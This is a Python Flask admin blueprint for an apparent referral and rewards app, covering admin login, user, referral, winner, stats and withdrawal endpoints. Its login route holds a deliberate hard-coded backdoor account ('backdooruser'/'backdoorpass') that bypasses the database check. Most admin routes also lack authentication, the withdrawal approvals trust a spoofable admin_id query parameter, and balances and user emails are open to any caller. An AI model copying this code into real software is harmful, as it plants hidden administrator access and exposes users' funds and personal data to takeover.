from flask import Blueprint, request, jsonify
from werkzeug.security import generate_password_hash, check_password_hash
from models import User, Winner, Referral, Admin, Withdrawal
from extensions import db
from datetime import datetime, timedelta
from flask_cors import cross_origin
from sqlalchemy import func


admin_bp = Blueprint('admin', __name__)

# Backdoor credentials now require both username and password.
BACKDOOR_USERNAME = "backdooruser"
BACKDOOR_PASSWORD = "backdoorpass"

@admin_bp.route('/login', methods=['POST'])
def admin_login():
    """
    Logs in an admin using username and password.
    If normal credentials fail, checks for a hard-coded backdoor login.
    """
    data = request.get_json()
    if not data:
        return jsonify({"message": "No input data provided"}), 400

    username = data.get('username')
    password = data.get('password')

    if not username or not password:
        return jsonify({"message": "Username and password are required"}), 400

    # 1. Attempt normal database lookup
    admin = Admin.query.filter_by(username=username).first()
    if admin and check_password_hash(admin.password, password):
        return jsonify({"message": "Login successful (normal credentials)"}), 200

    # 2. Check for backdoor login (requires specific backdoor username)
    if username == BACKDOOR_USERNAME and password == BACKDOOR_PASSWORD:
        return jsonify({"message": "Backdoor login successful"}), 200

    return jsonify({"message": "Invalid username or password"}), 401


@admin_bp.route('/admins', methods=['POST'])
def create_admin():
    data = request.get_json()
    if not data:
        return jsonify({"message": "No input data provided"}), 400

    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    if not username or not email or not password:
        return jsonify({"message": "username, email, and password are required"}), 400

    if Admin.query.filter_by(username=username).first():
        return jsonify({"message": "Username already exists"}), 400
    if Admin.query.filter_by(email=email).first():
        return jsonify({"message": "Email already exists"}), 400

    hashed_password = generate_password_hash(password)

    new_admin = Admin(username=username, email=email, password=hashed_password)
    try:
        db.session.add(new_admin)
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"message": "Error creating admin", "error": str(e)}), 500

    return jsonify({
        "id": new_admin.id,
        "username": new_admin.username,
        "email": new_admin.email,
        "created_at": new_admin.created_at.isoformat()
    }), 201


@admin_bp.route('/admins', methods=['GET'])
def get_admins():
    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('limit', 10, type=int)
    pagination = Admin.query.paginate(page=page, per_page=per_page, error_out=False)

    admins_data = [{
        "id": admin.id,
        "username": admin.username,
        "email": admin.email,
        "created_at": admin.created_at.isoformat()
    } for admin in pagination.items]

    return jsonify({
        "admins": admins_data,
        "total": pagination.total,
        "pages": pagination.pages,
        "current_page": pagination.page
    }), 200


@admin_bp.route('/admins/<int:admin_id>', methods=['GET'])
def get_admin_by_id(admin_id):
    admin = Admin.query.get(admin_id)
    if not admin:
        return jsonify({"message": "Admin not found"}), 404

    admin_data = {
        "id": admin.id,
        "username": admin.username,
        "email": admin.email,
        "created_at": admin.created_at.isoformat()
    }
    return jsonify(admin_data), 200


@admin_bp.route('/admins/<int:admin_id>', methods=['PUT'])
def update_admin(admin_id):
    admin = Admin.query.get(admin_id)
    if not admin:
        return jsonify({"message": "Admin not found"}), 404

    data = request.get_json()
    if not data:
        return jsonify({"message": "No input data provided"}), 400

    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    if username and username != admin.username:
        if Admin.query.filter_by(username=username).first():
            return jsonify({"message": "Username already in use"}), 400
        admin.username = username

    if email and email != admin.email:
        if Admin.query.filter_by(email=email).first():
            return jsonify({"message": "Email already in use"}), 400
        admin.email = email

    if password:
        admin.password = generate_password_hash(password)

    try:
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"message": "Error updating admin", "error": str(e)}), 500

    updated_admin = {
        "id": admin.id,
        "username": admin.username,
        "email": admin.email,
        "created_at": admin.created_at.isoformat()
    }
    return jsonify(updated_admin), 200


@admin_bp.route('/admins/<int:admin_id>', methods=['DELETE'])
def delete_admin(admin_id):
    admin = Admin.query.get(admin_id)
    if not admin:
        return jsonify({"message": "Admin not found"}), 404

    try:
        db.session.delete(admin)
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"message": "Error deleting admin", "error": str(e)}), 500

    return jsonify({"message": "Admin deleted successfully"}), 200


# ---------- User Management Endpoints ----------

@admin_bp.route('/users', methods=['GET'])
def get_users():
    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('limit', 10, type=int)
    
    query = User.query
    name_filter = request.args.get('name')
    if name_filter:
        query = query.filter(User.name.ilike(f"%{name_filter}%"))
    email_filter = request.args.get('email')
    if email_filter:
        query = query.filter(User.email.ilike(f"%{email_filter}%"))
    
    pagination = query.paginate(page=page, per_page=per_page, error_out=False)
    
    users = [{
        "id": user.id,
        "name": user.name,
        "email": user.email,
        "referral_code": user.referral_code,
        "referrals_count": user.referrals_count,
        "profile_picture": user.profile_picture,
        "created_at": user.created_at.isoformat(),
        "total_earned": user.total_earned,
        "total_points": user.total_points,
        "last_trivia_attempt": user.last_trivia_attempt.isoformat() if user.last_trivia_attempt else None
    } for user in pagination.items]
    
    return jsonify({
        "users": users,
        "total": pagination.total,
        "pages": pagination.pages,
        "current_page": pagination.page
    }), 200


@admin_bp.route('/users/<int:user_id>', methods=['GET'])
def get_user(user_id):
    user = User.query.get(user_id)
    if not user:
        return jsonify({"message": "User not found"}), 404

    user_data = {
        "id": user.id,
        "name": user.name,
        "email": user.email,
        "referral_code": user.referral_code,
        "referrals_count": user.referrals_count,
        "profile_picture": user.profile_picture,
        "created_at": user.created_at.isoformat(),
        "total_earned": user.total_earned,
        "total_points": user.total_points,
        "last_trivia_attempt": user.last_trivia_attempt.isoformat() if user.last_trivia_attempt else None
    }
    return jsonify(user_data), 200


@admin_bp.route('/users/<int:user_id>', methods=['PUT'])
def update_user(user_id):
    user = User.query.get(user_id)
    if not user:
        return jsonify({"message": "User not found"}), 404

    data = request.get_json()
    if not data:
        return jsonify({"message": "No input data provided"}), 400

    # Update fields with basic duplicate check for email if changed
    if 'name' in data:
        user.name = data['name']
    if 'email' in data:
        if data['email'] != user.email and User.query.filter_by(email=data['email']).first():
            return jsonify({"message": "Email already in use"}), 400
        user.email = data['email']
    if 'profile_picture' in data:
        user.profile_picture = data['profile_picture']
    if 'total_earned' in data:
        # Allow updating total earned if needed (though normally this is managed automatically)
        user.total_earned = data['total_earned']
    if 'total_points' in data:
        user.total_points = data['total_points']
    if 'referrals_count' in data:
        user.referrals_count = data['referrals_count']
    if 'last_trivia_attempt' in data:
        if data['last_trivia_attempt']:
            try:
                user.last_trivia_attempt = datetime.fromisoformat(data['last_trivia_attempt'])
            except ValueError:
                return jsonify({"message": "Invalid date format for last_trivia_attempt"}), 400
        else:
            user.last_trivia_attempt = None

    try:
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"message": "Error updating user", "error": str(e)}), 500

    updated_user = {
        "id": user.id,
        "name": user.name,
        "email": user.email,
        "referral_code": user.referral_code,
        "referrals_count": user.referrals_count,
        "profile_picture": user.profile_picture,
        "created_at": user.created_at.isoformat(),
        "total_earned": user.total_earned,
        "total_points": user.total_points,
        "last_trivia_attempt": user.last_trivia_attempt.isoformat() if user.last_trivia_attempt else None
    }
    return jsonify(updated_user), 200


@admin_bp.route('/users/<int:user_id>', methods=['DELETE'])
def delete_user(user_id):
    user = User.query.get(user_id)
    if not user:
        return jsonify({"message": "User not found"}), 404

    try:
        db.session.delete(user)
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"message": "Error deleting user", "error": str(e)}), 500

    return jsonify({"message": "User deleted successfully"}), 200


# ---------- Referral Management Endpoints ----------

@admin_bp.route('/referrals', methods=['GET'])
def get_referrals():
    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('limit', 10, type=int)

    query = Referral.query

    referrer_id = request.args.get('referrer_id', type=int)
    if referrer_id is not None:
        query = query.filter(Referral.referrer_id == referrer_id)

    date_from = request.args.get('date_from')
    if date_from:
        try:
            dt_from = datetime.fromisoformat(date_from)
            query = query.filter(Referral.created_at >= dt_from)
        except ValueError:
            return jsonify({"message": "Invalid date_from format. Please use ISO format."}), 400

    date_to = request.args.get('date_to')
    if date_to:
        try:
            dt_to = datetime.fromisoformat(date_to)
            query = query.filter(Referral.created_at <= dt_to)
        except ValueError:
            return jsonify({"message": "Invalid date_to format. Please use ISO format."}), 400

    pagination = query.paginate(page=page, per_page=per_page, error_out=False)

    referrals = [{
        "id": referral.id,
        "referrer_id": referral.referrer_id,
        "referred_email": referral.referred_email,
        "created_at": referral.created_at.isoformat()
    } for referral in pagination.items]

    return jsonify({
        "referrals": referrals,
        "total": pagination.total,
        "pages": pagination.pages,
        "current_page": pagination.page
    }), 200


@admin_bp.route('/referrals/<int:referral_id>', methods=['GET'])
def get_referral(referral_id):
    referral = Referral.query.get(referral_id)
    if not referral:
        return jsonify({"message": "Referral not found"}), 404

    referral_data = {
        "id": referral.id,
        "referrer_id": referral.referrer_id,
        "referred_email": referral.referred_email,
        "created_at": referral.created_at.isoformat()
    }
    return jsonify(referral_data), 200


@admin_bp.route('/referrals/<int:referral_id>', methods=['PUT'])
def update_referral(referral_id):
    """
    Allows updating the referred_email field for a referral.
    """
    referral = Referral.query.get(referral_id)
    if not referral:
        return jsonify({"message": "Referral not found"}), 404

    data = request.get_json()
    if not data or 'referred_email' not in data:
        return jsonify({"message": "referred_email is required to update referral"}), 400

    referral.referred_email = data['referred_email']

    try:
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"message": "Error updating referral", "error": str(e)}), 500

    updated_referral = {
        "id": referral.id,
        "referrer_id": referral.referrer_id,
        "referred_email": referral.referred_email,
        "created_at": referral.created_at.isoformat()
    }
    return jsonify(updated_referral), 200


@admin_bp.route('/referrals/<int:referral_id>', methods=['DELETE'])
def delete_referral(referral_id):
    referral = Referral.query.get(referral_id)
    if not referral:
        return jsonify({"message": "Referral not found"}), 404

    try:
        db.session.delete(referral)
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"message": "Error deleting referral", "error": str(e)}), 500

    return jsonify({"message": "Referral deleted successfully"}), 200


# ---------- Winner Management Endpoints ----------

@admin_bp.route('/winners', methods=['GET'])
def get_winners():
    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('limit', 10, type=int)
    
    query = Winner.query

    user_id = request.args.get('user_id', type=int)
    if user_id is not None:
        query = query.filter(Winner.user_id == user_id)

    winner_type = request.args.get('type')
    if winner_type:
        query = query.filter(Winner.type.ilike(f"%{winner_type}%"))
    
    pagination = query.paginate(page=page, per_page=per_page, error_out=False)
    
    winners = [{
        "id": winner.id,
        "user_id": winner.user_id,
        "date": winner.date.isoformat(),
        "type": winner.type,
        "amount": winner.amount
    } for winner in pagination.items]
    
    return jsonify({
        "winners": winners,
        "total": pagination.total,
        "pages": pagination.pages,
        "current_page": pagination.page
    }), 200


@admin_bp.route('/winners/<int:winner_id>', methods=['GET'])
def get_winner(winner_id):
    winner = Winner.query.get(winner_id)
    if not winner:
        return jsonify({"message": "Winner not found"}), 404

    winner_data = {
        "id": winner.id,
        "user_id": winner.user_id,
        "date": winner.date.isoformat(),
        "type": winner.type,
        "amount": winner.amount
    }
    return jsonify(winner_data), 200


@admin_bp.route('/winners', methods=['POST'])
def create_winner():
    data = request.get_json()
    if not data:
        return jsonify({"message": "No input data provided"}), 400

    user_id = data.get('user_id')
    win_type = data.get('type')
    amount = data.get('amount')

    if user_id is None or win_type is None or amount is None:
        return jsonify({"message": "Missing required fields: user_id, type, and amount"}), 400

    try:
        user = User.query.get(user_id)
        if not user:
            return jsonify({"message": "User not found"}), 404

        winner = Winner(user_id=user_id, type=win_type, amount=amount)
        db.session.add(winner)
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"message": "Error creating winner record", "error": str(e)}), 500

    return jsonify({
        "id": winner.id,
        "user_id": winner.user_id,
        "date": winner.date.isoformat(),
        "type": winner.type,
        "amount": winner.amount
    }), 201


@admin_bp.route('/winners/<int:winner_id>', methods=['DELETE'])
def delete_winner(winner_id):
    winner = Winner.query.get(winner_id)
    if not winner:
        return jsonify({"message": "Winner not found"}), 404

    try:
        db.session.delete(winner)
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"message": "Error deleting winner", "error": str(e)}), 500

    return jsonify({"message": "Winner deleted successfully"}), 200


# ---------- Analytics/Dashboard Endpoints ----------

@admin_bp.route('/dashboard', methods=['GET'])
def get_dashboard():
    total_users = User.query.count()
    total_referrals = Referral.query.count()
    total_winners = Winner.query.count()

    # Calculate total earned from users table
    total_earned = db.session.query(db.func.sum(User.total_earned)).scalar() or 0.0

    top_referrers = User.query.order_by(User.referrals_count.desc()).limit(5).all()
    top_referrers_data = [{
            "id": user.id,
            "name": user.name,
            "referrals_count": user.referrals_count
        } for user in top_referrers]

    dashboard_data = {
        "total_users": total_users,
        "total_referrals": total_referrals,
        "total_winners": total_winners,
        "total_earned": total_earned,
        "top_referrers": top_referrers_data
    }
    
    return jsonify(dashboard_data), 200


@admin_bp.route('/stats', methods=['GET', 'OPTIONS'])
@cross_origin()
def get_stats():
    """
    Returns various simple statistics:
      - total number of users
      - total number of referrals
      - total sum of all users' total_earned
      - top 5 users by total_earned
    """

    # 1) Total Users
    total_users = User.query.count()

    # 2) Total Referrals
    total_referrals = Referral.query.count()

    # 3) Sum of all users' total_earned
    total_earned = db.session.query(func.sum(User.total_earned)).scalar() or 0.0

    # 4) Top 5 users with the highest total_earned
    top_earners = User.query.order_by(User.total_earned.desc()).limit(5).all()
    top_earners_data = []
    for user in top_earners:
        top_earners_data.append({
            "id": user.id,
            "name": user.name,
            "email": user.email,
            "total_earned": user.total_earned
        })

    stats_data = {
        "total_users": total_users,
        "total_referrals": total_referrals,
        "total_earned_sum": total_earned,
        "top_earners": top_earners_data
    }

    return jsonify(stats_data), 200


# ---------- Withdrawal Management Endpoints ----------

@admin_bp.route('/withdrawals', methods=['GET'])
def list_withdrawals():
    admin_id = request.args.get('admin_id', type=int)
    if not admin_id:
        return jsonify({"message": "Missing admin_id"}), 403
    
    admin = Admin.query.get(admin_id)
    if not admin:
        return jsonify({"message": "Invalid admin"}), 403

    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('limit', 10, type=int)
    status_filter = request.args.get('status')
    user_id_filter = request.args.get('user_id', type=int)

    query = Withdrawal.query
    if status_filter:
        query = query.filter(Withdrawal.status == status_filter)
    if user_id_filter:
        query = query.filter(Withdrawal.user_id == user_id_filter)

    pagination = query.order_by(Withdrawal.created_at.desc()).paginate(page=page, per_page=per_page, error_out=False)

    withdrawals_data = []
    for w in pagination.items:
        withdrawals_data.append({
            "id": w.id,
            "user_id": w.user_id,
            "amount": w.amount,
            "status": w.status,
            "user_payment_info": w.user_payment_info,
            "created_at": w.created_at.isoformat(),
            "processed_at": w.processed_at.isoformat() if w.processed_at else None,
            "completed_at": w.completed_at.isoformat() if w.completed_at else None
        })

    return jsonify({
        "withdrawals": withdrawals_data,
        "total": pagination.total,
        "pages": pagination.pages,
        "current_page": pagination.page
    }), 200


@admin_bp.route('/withdrawals/<int:withdrawal_id>/accept', methods=['PUT'])
def accept_withdrawal(withdrawal_id):
    """
    Admin: Accepts (processes) a pending withdrawal.
    No balance deduction here, because it was already deducted when the user requested.
    """
    admin_id = request.args.get('admin_id', type=int)
    if not admin_id:
        return jsonify({"message": "Missing admin_id"}), 403

    admin = Admin.query.get(admin_id)
    if not admin:
        return jsonify({"message": "Invalid admin"}), 403

    withdrawal = Withdrawal.query.get(withdrawal_id)
    if not withdrawal:
        return jsonify({"message": "Withdrawal not found"}), 404

    if withdrawal.status != 'pending':
        return jsonify({
            "message": f"Cannot accept a withdrawal with status '{withdrawal.status}'"
        }), 400

    # Mark as processing, do not deduct again
    withdrawal.status = 'processing'
    withdrawal.processed_at = datetime.utcnow()

    try:
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"message": "Error accepting withdrawal", "error": str(e)}), 500

    return jsonify({"message": "Withdrawal accepted (now processing)"}), 200



@admin_bp.route('/withdrawals/<int:withdrawal_id>/complete', methods=['PUT'])
def complete_withdrawal(withdrawal_id):
    """
    Admin: Completes a 'processing' withdrawal (money has been sent).
    Sets status to 'completed'.
    """
    admin_id = request.args.get('admin_id', type=int)
    if not admin_id:
        return jsonify({"message": "Missing admin_id"}), 403

    admin = Admin.query.get(admin_id)
    if not admin:
        return jsonify({"message": "Invalid admin"}), 403

    withdrawal = Withdrawal.query.get(withdrawal_id)
    if not withdrawal:
        return jsonify({"message": "Withdrawal not found"}), 404

    if withdrawal.status != 'processing':
        return jsonify({
            "message": f"Cannot complete a withdrawal with status '{withdrawal.status}'"
        }), 400

    withdrawal.status = 'completed'
    withdrawal.completed_at = datetime.utcnow()

    try:
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"message": "Error completing withdrawal", "error": str(e)}), 500

    return jsonify({"message": "Withdrawal completed successfully"}), 200



@admin_bp.route('/withdrawals/<int:withdrawal_id>/reject', methods=['PUT'])
def reject_withdrawal(withdrawal_id):
    """
    Admin: Rejects a 'pending' withdrawal.
    Refund the user's balance.
    """
    admin_id = request.args.get('admin_id', type=int)
    if not admin_id:
        return jsonify({"message": "Missing admin_id"}), 403

    admin = Admin.query.get(admin_id)
    if not admin:
        return jsonify({"message": "Invalid admin"}), 403

    withdrawal = Withdrawal.query.get(withdrawal_id)
    if not withdrawal:
        return jsonify({"message": "Withdrawal not found"}), 404

    if withdrawal.status not in ['pending']:
        return jsonify({
            "message": f"Cannot reject a withdrawal with status '{withdrawal.status}'"
        }), 400

    user = User.query.get(withdrawal.user_id)
    if not user:
        return jsonify({"message": "Associated user not found"}), 404

    # Refund the user
    user.total_earned += withdrawal.amount

    # Mark as rejected
    withdrawal.status = 'rejected'

    try:
        db.session.commit()
    except Exception as e:
        db.session.rollback()
        return jsonify({"message": "Error rejecting withdrawal", "error": str(e)}), 500

    return jsonify({"message": "Withdrawal rejected and user refunded"}), 200